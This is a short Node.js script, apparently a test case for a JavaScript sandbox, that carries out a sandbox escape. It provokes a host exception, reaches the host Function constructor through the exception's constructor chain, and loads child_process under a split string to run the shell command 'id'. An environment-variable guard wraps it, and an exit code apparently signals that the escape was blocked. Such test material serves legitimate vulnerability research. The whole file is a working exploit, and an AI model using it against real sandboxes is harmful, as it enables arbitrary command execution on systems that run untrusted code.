if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message ===
			"Code generation from strings disallowed for this context" ||
		error.message ===
			"Cannot read properties of undefined (reading 'mainModule')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

try {
	this.process.removeListener(); // or .on, .once, or anything that throws a host exception
} catch (host_exception) {
	console.log("host exception: " + host_exception.toString());
	host_constructor = host_exception.constructor.constructor;
	host_process = host_constructor("return this")().process;
	console.log(
		"host execution: " +
			host_process.mainModule
				.require("child" + "_process")
				.execSync("id")
				.toString(),
	);
}
